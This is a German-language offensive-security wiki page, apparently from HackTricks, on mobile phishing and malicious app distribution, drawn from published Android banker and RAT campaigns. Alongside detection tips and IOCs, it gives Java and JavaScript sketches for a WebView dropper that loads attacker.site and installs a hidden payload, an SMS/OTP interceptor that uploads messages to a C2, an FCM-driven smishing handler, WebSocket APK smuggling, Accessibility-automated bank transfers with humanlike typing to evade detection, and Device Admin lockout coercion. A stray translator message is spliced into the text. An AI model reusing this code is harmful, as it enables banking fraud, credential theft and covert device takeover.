# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Diese Seite behandelt Techniken, die von Bedrohungsakteuren verwendet werden, um **malicious Android APKs** und **iOS mobile-configuration profiles** über phishing (SEO, social engineering, gefälschte Stores, Dating-Apps usw.) zu verbreiten.
> Das Material basiert auf der SarangTrap-Kampagne, die von Zimperium zLabs (2025) aufgedeckt wurde, sowie auf weiterer öffentlicher Forschung.

## Ablauf des Angriffs

1. **SEO/Phishing-Infrastruktur**
* Registrieren Dutzende von look-alike Domains (dating, cloud share, car service…).
– Verwenden lokale Sprach-Keywords und Emojis im `<title>`-Element, um bei Google zu ranken.
– Stellen sowohl Android (`.apk`) als auch iOS-Installationsanweisungen auf derselben Landingpage bereit.
2. Erste Stufe: Download
* Android: direkter Link zu einer *unsigned* oder „third-party store“ APK.
* iOS: `itms-services://` oder einfacher HTTPS-Link zu einem malicious **mobileconfig**-Profil (siehe unten).
3. Nachinstallation: Social Engineering
* Beim ersten Start fragt die App nach einem **Einladungs-/Verifizierungscode** (Illusion exklusiven Zugangs).
* Der Code wird **per HTTP POST** an das Command-and-Control (C2) gesendet.
* C2 antwortet `{"success":true}` ➜ malware fährt fort.
* Sandbox-/AV-Dynamikanalysen, die niemals einen gültigen Code absenden, zeigen **kein bösartiges Verhalten** (Evasion).
4. Laufzeit-Berechtigungsmissbrauch (Android)
* Gefährliche Berechtigungen werden erst **nach positiver C2-Antwort** angefordert:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Neuere Varianten **entfernen `<uses-permission>` für SMS aus der `AndroidManifest.xml`**, lassen aber den Java/Kotlin-Codepfad, der SMS per Reflection liest ⇒ senkt die statische Bewertung, funktioniert jedoch weiterhin auf Geräten, die die Berechtigung via `AppOps`-Missbrauch oder ältere Targets gewähren.

5. Android 13+ Restricted settings & Dropper-Bypass (SecuriDropper‑style)
* Android 13 hat **Restricted settings** für sideloaded Apps eingeführt: Accessibility- und Notification-Listener-Schalter sind ausgegraut, bis der Nutzer restricted settings explizit in **App info** erlaubt.
* Phishing-Seiten und Dropper liefern jetzt Schritt‑für‑Schritt UI-Anweisungen, um **restricted settings zu erlauben** für die sideloaded App und anschließend Accessibility/Notification-Zugriff zu aktivieren.
* Ein neuerer Bypass ist die Installation der Payload über einen **session‑basierten PackageInstaller-Flow** (die gleiche Methode, die App Stores verwenden). Android behandelt die App dann als store‑installed, sodass Restricted settings Accessibility nicht mehr blockiert.
* Triage-Hinweis: In einem Dropper nach `PackageInstaller.createSession/openSession` suchen sowie nach Code, der das Opfer sofort zu `ACTION_ACCESSIBILITY_SETTINGS` oder `ACTION_NOTIFICATION_LISTENER_SETTINGS` navigiert.

6. Fassade UI & Hintergrundsammlung
* Die App zeigt harmlose Views (SMS viewer, gallery picker), lokal implementiert.
* Gleichzeitig exfiltriert sie:
- IMEI / IMSI, Telefonnummer
- Voller `ContactsContract`-Dump (JSON-Array)
- JPEG/PNG aus `/sdcard/DCIM`, komprimiert mit [Luban](https://github.com/Curzibn/Luban), um die Größe zu reduzieren
- Optionaler SMS-Inhalt (`content://sms`)
Payloads werden **batch-zipped** und per `HTTP POST /upload.php` gesendet.
7. iOS-Delivery-Technik
* Ein einzelnes **mobile-configuration profile** kann `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` usw. anfordern, um das Gerät in eine MDM‑ähnliche Supervision einzuschreiben.
* Social‑Engineering-Anweisungen:
1. Einstellungen öffnen ➜ *Profile downloaded*.
2. Dreimal auf *Install* tippen (Screenshots auf der Phishing-Seite).
3. Dem unsigned profile vertrauen ➜ Angreifer erhält *Contacts*- & *Photo*-Entitlements ohne App Store Review.
8. iOS Web Clip Payload (phishing app icon)
* `com.apple.webClip.managed` payloads können eine **Phishing-URL zum Home Screen pinnen** mit gebrandetem Icon/Label.
* Web Clips können **full‑screen** laufen (verstecken die Browser-UI) und als **non‑removable** markiert werden, wodurch das Opfer gezwungen ist, das Profil zu löschen, um das Icon zu entfernen.
9. Netzwerkebene
* Klartext-HTTP, oft Port 80 mit HOST-Header wie `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (kein TLS → leicht zu erkennen).

## Red-Team-Tipps

* **Dynamic Analysis Bypass** – Während der Malware-Analyse die Einladungscode-Phase mit Frida/Objection automatisieren, um den bösartigen Pfad zu erreichen.
* **Manifest vs. Runtime Diff** – Vergleichen Sie `aapt dump permissions` mit zur Laufzeit `PackageManager#getRequestedPermissions()`; fehlende gefährliche Perms sind ein Warnsignal.
* **Network Canary** – Konfigurieren Sie `iptables -p tcp --dport 80 -j NFQUEUE`, um unsaubere POST-Bursts nach Code-Eingabe zu erkennen.
* **mobileconfig Inspection** – Verwenden Sie `security cms -D -i profile.mobileconfig` auf macOS, um `PayloadContent` aufzulisten und übermäßige Entitlements zu erkennen.

## Nützlicher Frida‑Snippet: Auto‑Bypass Einladungscode

<details>
<summary>Frida: Auto‑Bypass für Einladungscode</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indikatoren (Allgemein)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Dieses Muster wurde in Kampagnen beobachtet, die Themen zu staatlichen Leistungen missbrauchen, um indische UPI-Zugangsdaten und OTPs zu stehlen. Betreiber verketten vertrauenswürdige Plattformen für Lieferung und Resilienz.

### Lieferkette über vertrauenswürdige Plattformen
- YouTube-Video-Köder → Beschreibung enthält einen Kurzlink
- Kurzlink → GitHub Pages-Phishingseite, die das legitime Portal imitiert
- Dasselbe GitHub-Repo hostet eine APK mit einem gefälschten “Google Play”-Badge, das direkt auf die Datei verlinkt
- Dynamische Phishing-Seiten laufen auf Replit; der Remote-Befehlskanal nutzt Firebase Cloud Messaging (FCM)

### Dropper mit eingebettetem Payload und Offline-Installation
- Die erste APK ist ein Installer (dropper), der die eigentliche Malware unter `assets/app.apk` mitliefert und den Nutzer auffordert, Wi‑Fi/mobile data zu deaktivieren, um cloud-basierte Erkennung abzuschwächen.
- Der eingebettete Payload installiert sich unter einem unauffälligen Namen (z. B. “Secure Update”). Nach der Installation sind sowohl der Installer als auch der Payload als separate Apps vorhanden.

Statischer Triage-Tipp (grep nach eingebetteten Payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamische Endpoint-Erkennung via shortlink
- Malware ruft von einem shortlink eine Klartext-, durch Kommas getrennte Liste aktiver Endpoints ab; einfache String-Transformationen erzeugen den finalen Pfad zur Phishing-Seite.

Beispiel (bereinigt):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudocode:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Der Schritt „Make payment of ₹1 / UPI‑Lite“ lädt ein Angreifer-HTML-Formular von einem dynamischen Endpoint innerhalb einer WebView und erfasst sensible Felder (phone, bank, UPI PIN), die per `POST` an `addup.php` gesendet werden.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Selbstverbreitung und Abfangen von SMS/OTP
- Aggressive Berechtigungen werden beim ersten Start angefordert:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakte werden iteriert, um smishing-SMS massenhaft vom Gerät des Opfers zu versenden.
- Eingehende SMS werden von einem broadcast receiver abgefangen und zusammen mit Metadaten (Absender, Nachrichtentext, SIM slot, per-device random ID) an `/addsm.php` hochgeladen.

Receiver-Skizze:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) als resilienter C2
- Die payload registriert sich bei FCM; push messages enthalten ein `_type`-Feld, das als Schalter verwendet wird, um Aktionen auszulösen (z. B. update von phishing text templates, toggle behaviours).

Beispiel FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler Skizze:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indikatoren/IOCs
- APK enthält sekundäre payload in `assets/app.apk`
- WebView lädt Zahlungsseite von `gate.htm` und exfiltrates zu `/addup.php`
- SMS-Exfiltration zu `/addsm.php`
- Shortlink-gesteuerter config fetch (z. B. `rebrand.ly/*`) mit zurückgegebenen CSV-Endpunkten
- Apps mit der Bezeichnung “Update/Secure Update”
- FCM `data`-Nachrichten mit einem `_type`-Discriminator in nicht vertrauenswürdigen Apps

---

## Socket.IO/WebSocket-basierte APK Smuggling + Fake Google Play Pages

Angreifer ersetzen zunehmend statische APK-Links durch einen Socket.IO/WebSocket-Kanal, der in Google Play–ähnliche Köder eingebettet ist. Das verschleiert die payload-URL, umgeht URL-/extension-Filter und erhält ein realistisches Install-UX.

Typischer Client-Ablauf, in der Praxis beobachtet:

<details>
<summary>Socket.IO gefälschter Play-Downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Warum es einfachen Kontrollen entgeht:
- No static APK URL is exposed; payload is reconstructed in memory from WebSocket frames.
- URL/MIME/extension filters that block direct .apk responses may miss binary data tunneled via WebSockets/Socket.IO.
- Crawlers and URL sandboxes that don’t execute WebSockets won’t retrieve the payload.

Siehe auch WebSocket tradecraft und Tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay- und Device-Admin-Missbrauch, ATS-Automatisierung und NFC-Relay-Orchestrierung – RatOn-Fallstudie

Die RatOn banker/RAT-Kampagne (ThreatFabric) ist ein konkretes Beispiel dafür, wie moderne mobile Phishing-Operationen WebView-Dropper, Accessibility-gesteuerte UI-Automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover und sogar NFC-relay orchestration kombinieren. Dieser Abschnitt abstrahiert die wiederverwendbaren Techniken.

### Stage-1: WebView → native Installations-Bridge (dropper)
Angreifer zeigen eine WebView, die auf eine Angreiferseite verweist, und injizieren eine JavaScript-Schnittstelle, die einen nativen Installer exponiert. Ein Tipp auf einen HTML-Button ruft nativen Code auf, der eine in den Assets des Droppers gebündelte Second-Stage-APK installiert und diese anschließend direkt startet.

Minimales Muster:

<details>
<summary>Minimalmuster des Stage-1-Droppers (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Ich habe keinen Text zum Übersetzen erhalten. Bitte füge den Inhalt von src/generic-methodologies-and-resources/phishing-methodology/mobile-phishing-malicious-apps.md (Markdown/HTML) hier ein, dann übersetze ich ihn ins Deutsche und erhalte alle Tags/Links unverändert.
```html
<button onclick="bridge.installApk()">Install</button>
```
Nach der Installation startet der dropper die payload über explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting-Idee: nicht vertrauenswürdige Apps, die `addJavascriptInterface()` aufrufen und installerähnliche Methoden an WebView bereitstellen; APK liefert eine eingebettete sekundäre Nutzlast unter `assets/` und ruft die Package Installer Session API auf.

### Consent funnel: Accessibility + Device Admin + nachfolgende Runtime-Prompts
Stage-2 öffnet eine WebView, die eine „Access“-Seite hostet. Deren Button ruft eine exportierte Methode auf, die das Opfer zu den Accessibility-Einstellungen navigiert und das Aktivieren des bösartigen Dienstes anfragt. Sobald dies gewährt ist, nutzt die Malware Accessibility, um automatisch durch nachfolgende Laufzeit-Berechtigungsdialoge zu klicken (Kontakte, Overlay, Verwaltung der Systemeinstellungen, etc.) und fordert Device Admin an.

- Accessibility hilft programmatisch, spätere Prompts zu akzeptieren, indem es im Node-Tree Buttons wie “Allow”/“OK” findet und Klicks auslöst.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operatoren können Befehle ausgeben, um:
- ein Vollbild-Overlay von einer URL anzuzeigen, oder
- inline HTML zu übergeben, das in ein WebView-Overlay geladen wird.

Wahrscheinliche Einsatzzwecke: coercion (PIN-Eingabe), Öffnen von Wallets zum Abgreifen von PINs, ransom-Nachrichten. Einen Befehl vorsehen, um sicherzustellen, dass die Overlay-Berechtigung erteilt ist, falls sie fehlt.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: periodisch den Accessibility node tree dumpen, sichtbare Texte/Rollen/Bounds serialisieren und als pseudo-screen an C2 senden (Befehle wie `txt_screen` einmalig und `screen_live` kontinuierlich).
- High-fidelity: MediaProjection anfordern und bei Bedarf screen-casting/recording starten (Befehle wie `display` / `record`).

### ATS playbook (Bank-App-Automatisierung)
Gegeben ein JSON-Task: die Bank-App öffnen, die UI über Accessibility mit einer Mischung aus Textabfragen und Koordinaten-Taps steuern und die Zahlungs-PIN des Opfers eingeben, wenn diese abgefragt wird.

Beispieltask:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Beispieltexte, die in einem Zielablauf gesehen wurden (CZ → EN):
- "Nová platba" → "Neue Zahlung"
- "Zadat platbu" → "Zahlung eingeben"
- "Nový příjemce" → "Neuer Empfänger"
- "Domácí číslo účtu" → "Inländische Kontonummer"
- "Další" → "Weiter"
- "Odeslat" → "Senden"
- "Ano, pokračovat" → "Ja, fortfahren"
- "Zaplatit" → "Bezahlen"
- "Hotovo" → "Fertig"

Operators können auch Transferlimits prüfen/erhöhen über Befehle wie `check_limit` und `limit`, die ähnlich durch die Limits-UI navigieren.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Ablauf: entsperren (gestohlener PIN oder angegebenes Passwort), zu Security/Recovery navigieren, Seed-Phrase aufdecken/anzeigen, per Keylogger erfassen/exfiltrieren. Implementieren Sie sprachabhängige Selektoren (EN/RU/CZ/SK), um die Navigation über verschiedene Sprachen zu stabilisieren.

### Device-Admin-Erzwingung
Device Admin APIs werden verwendet, um die Möglichkeiten zur PIN-Erfassung zu erhöhen und das Opfer zu frustrieen:

- Sofortige Sperre:
```java
dpm.lockNow();
```
- Aktuelle Anmeldeinformationen ablaufen lassen, um eine Änderung zu erzwingen (Accessibility erfasst neue PIN/Passwort):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Erzwinge eine Entsperrung ohne Biometrie, indem du keyguard biometric features deaktivierst:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Hinweis: Viele DevicePolicyManager-Kontrollen erfordern Device Owner/Profile Owner auf aktuellen Android-Versionen; einige OEM-Builds können lax sein. Immer auf Ziel-OS/OEM validieren.

### NFC relay orchestration (NFSkate)
Stage-3 kann ein externes NFC-relay-Modul installieren und starten (z. B. NFSkate) und ihm sogar eine HTML-Vorlage übergeben, um das Opfer während des Relay zu führen. Damit wird kontaktloses card-present cash-out neben online ATS ermöglicht.

Hintergrund: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator-Befehlssatz (Beispiel)
- UI/Zustand: `txt_screen`, `screen_live`, `display`, `record`
- Soziale Kanäle: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Gerät: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Kommunikation/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-gesteuerte ATS Anti-Erkennung: menschliche Texteingabe-Kadenz und duale Textinjektion (Herodotus)

Bedrohungsakteure mischen zunehmend Accessibility-gesteuerte Automation mit Anti-Detection, die gegen grundlegende Verhaltensbiometrie abgestimmt ist. Ein aktueller banker/RAT zeigt zwei komplementäre Textübertragungsmodi und einen Operator-Umschalter, um menschliches Tippen mit randomisierter Kadenz zu simulieren.

- Discovery-Modus: sichtbare Nodes mit Selektoren und bounds enumerieren, um Eingaben präzise zu targetieren (ID, text, contentDescription, hint, bounds) bevor gehandelt wird.
- Duale Textinjektion:
- Mode 1 – `ACTION_SET_TEXT` direkt auf dem Zielnode (stabil, keine Tastatur);
- Mode 2 – clipboard set + `ACTION_PASTE` in das fokusierte Node (funktioniert, wenn direktes setText blockiert ist).
- Menschliche Kadenz: die vom Operator bereitgestellte Zeichenfolge aufteilen und Zeichen für Zeichen mit randomisierten 300–3000 ms Verzögerungen zwischen den Events liefern, um Heuristiken für „machine-speed typing“ zu umgehen. Implementiert entweder durch progressives Erhöhen des Werts via `ACTION_SET_TEXT` oder durch Einfügen eines Zeichens nach dem anderen.

<details>
<summary>Java-Skizze: node discovery + verzögerte pro-Zeichen Eingabe via setText oder clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Blockierende Overlays zur Verschleierung von Betrug:
- Ein Vollbild-`TYPE_ACCESSIBILITY_OVERLAY` mit vom Operator gesteuerter Deckkraft anzeigen; es für das Opfer undurchsichtig halten, während die Remote-Automatisierung darunter weiterläuft.
- Typischerweise bereitgestellte Befehle: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Minimales Overlay mit einstellbarer Alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Oft gesehene Operator-Kontrollprimitive: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (Bildschirmfreigabe).

## Quellen

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
